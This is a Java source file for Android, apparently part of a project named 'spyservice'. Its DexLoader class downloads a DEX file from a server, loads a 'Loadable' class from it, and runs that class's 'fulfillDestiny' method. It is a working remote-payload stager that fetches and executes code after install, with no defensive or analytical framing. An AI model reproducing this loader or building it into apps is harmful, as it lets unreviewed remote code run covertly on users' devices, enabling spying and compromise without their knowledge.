/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 + Copyright (C) 2020 Eldar Timraleev (aka CRaFT4ik). All rights reserved.                        +
 + Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file      +
 + except in compliance with the License. You may obtain a copy of the License at                 +
 + http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in   +
 + writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT    +
 + WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the       +
 + specific language governing permissions and limitations under the License.                     +
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

package ru.er_log.spyservice.loadable;

import android.content.Context;
import android.util.Log;

import androidx.annotation.Nullable;

import org.jetbrains.annotations.NotNull;

import java.io.File;
import java.util.Set;

import ru.er_log.spyservice.Settings;
import ru.er_log.spyservice.network.DownloadManager;
import ru.er_log.spyservice.network.IDownloadCallback;

public class DexLoader
{
    private final Context context;
    private final DownloadManager downloadManager;

    private File dexFile;
    private ILoadable loadable;

    public DexLoader(@NotNull Context context, @NotNull DownloadManager downloadManager)
    {
        this.context = context;
        this.downloadManager = downloadManager;
    }

    public void loadDex() throws DEXNotFoundException
    {
        if (dexFile == null || !dexFile.isFile())
            throw new DEXNotFoundException("Can't find DEX file. Maybe not downloaded yet.");

        String loadableClass = "ru.er_log.spyservice.loadable.Loadable";
        loadable = Util.loadModule(loadableClass, dexFile, context.getDir("outdex", Context.MODE_PRIVATE), context.getClassLoader());
        if (loadable == null)
            Log.e(Settings.LOG_TAG, "Can't load class: " + loadableClass);
        else
            Log.d(Settings.LOG_TAG, "DEX classes loaded");
    }

    /** If {@param callback} is null, then will used synchronized method. */
    public boolean downloadDex(@Nullable IDownloadCallback callback)
    {
        if (callback == null) // Synchronous.
        {
            if (downloadManager.download("dex", getConstDexPath(), null))
            {
                dexFile = new File(getConstDexPath());
                return true;
            } else
            {
                dexFile = null;
                return false;
            }
        } else // Asynchronous.
        {
            downloadManager.download("dex", getConstDexPath(), callback);
            return true;
        }
    }

    /** If DEX file can't be downloaded, you can set it using this method. */
    public void forceSetDEXFile(File file)
    {
        this.dexFile = file;
    }

    public void forceSetDEXLoader(ILoadable loadable)
    {
        this.loadable = loadable;
    }

    public boolean start() throws DEXNotLoadedException
    {
        if (loadable == null)
            throw new DEXNotLoadedException("DEX not loaded");

        return loadable.fulfillDestiny(context);
    }

    public String getConstDexPath()
    {
        return new File(context.getDir("classes", Context.MODE_PRIVATE), "classes.dex").getAbsolutePath();
    }

    public static class DEXNotLoadedException extends Exception
    {
        DEXNotLoadedException() { super(); }
        DEXNotLoadedException(String message) { super(message); }
    }

    public static class DEXNotFoundException extends Exception
    {
        DEXNotFoundException() { super(); }
        DEXNotFoundException(String message) { super(message); }
    }
}
